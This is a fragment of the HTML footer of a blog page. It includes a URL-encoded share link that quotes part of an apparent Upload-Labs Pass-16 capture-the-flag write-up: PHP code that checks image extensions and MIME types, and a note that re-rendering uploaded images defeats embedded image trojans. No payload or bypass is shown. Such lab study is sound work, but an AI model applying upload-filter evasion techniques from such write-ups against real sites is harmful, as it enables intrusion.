%e5%87%ba%e9%94%99%ef%bc%81%26%2334%3b%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%7d%3cspan%20style%3d%22color%3a%2366d9ef%22%3eelse%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%28%24fileext%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bpng%26%2334%3b%3c%2fspan%3e%29%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%26amp%3b%26amp%3b%3c%2fspan%3e%20%28%24filetype%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bimage%2fpng%26%2334%3b%3c%2fspan%3e%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e......%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%7d%3cspan%20style%3d%22color%3a%2366d9ef%22%3eelse%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%28%24fileext%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bgif%26%2334%3b%3c%2fspan%3e%29%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%26amp%3b%26amp%3b%3c%2fspan%3e%20%28%24filetype%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bimage%2fgif%26%2334%3b%3c%2fspan%3e%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e.....%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%7d%3cspan%20style%3d%22color%3a%2366d9ef%22%3eelse%3c%2fspan%3e%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%24msg%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3b%e5%8f%aa%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0%e5%90%8e%e7%bc%80%e4%b8%ba.jpg%7c.png%7c.gif%e7%9a%84%e5%9b%be%e7%89%87%e6%96%87%e4%bb%b6%ef%bc%81%26%2334%3b%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fcode%3e%3c%2fpre%3e%3c%2fdiv%3e%3cp%3e%e2%80%8b%09%e6%8f%90%e7%a4%ba%ef%bc%9a%3ccode%3e%e6%9c%acpass%e9%87%8d%e6%96%b0%e6%b8%b2%e6%9f%93%e4%ba%86%e5%9b%be%e7%89%87%ef%bc%81%3c%2fcode%3e%e3%80%82%e8%af%b4%e6%98%8e%e5%af%b9%e5%9b%be%e7%89%87%e8%bf%9b%e8%a1%8c%e4%ba%86%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%ef%bc%8c%e6%88%91%e7%9a%84%e7%90%86%e8%a7%a3%e5%b0%b1%e6%98%af%e6%8a%8a%e4%b8%8a%e4%bc%a0%e7%9a%84%e5%9b%be%e7%89%87%ef%bc%8c%e6%a0%b9%e6%8d%ae%e4%b8%80%e4%ba%9b%e6%a0%87%e5%87%86%ef%bc%8c%e5%8f%aa%e6%8a%8a%e5%9b%be%e7%89%87%e4%b8%ad%e7%9a%84%e5%9b%be%e7%89%87%e4%bf%a1%e6%81%af%e6%8f%90%e5%8f%96%e5%87%ba%e6%9d%a5%ef%bc%8c%e5%86%8d%e7%94%9f%e6%88%90%e4%b8%80%e4%b8%aa%e5%9b%be%e7%89%87%ef%bc%8c%e5%8f%af%e4%bb%a5%e6%9c%89%e6%95%88%e9%81%bf%e5%85%8d%e5%9b%be%e7%89%87%e9%a9%ac%e3%80%82%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=%2fposts%2fctf%2fupload-labs4%2f&t=Upload-Labs%e4%b9%8bPass-16" aria-label="Hacker News"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu-toggle class=icon href=# onclick='return $("#nav-footer").toggle(),!1' aria-label=Menu><i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick='return $("#toc-footer").toggle(),!1' aria-label=TOC><i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick='return $("#share-footer").toggle(),!1' aria-label=Share><i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2025</div><div class=footer-right><nav><ul><li><a href=/>Home</a></li><li><a href=/posts>Writings</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li><li><a href=/friends>Friends</a></li><li><a href>开往</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script><script src=/js/code-copy.js></script><script>MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]]},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script></html>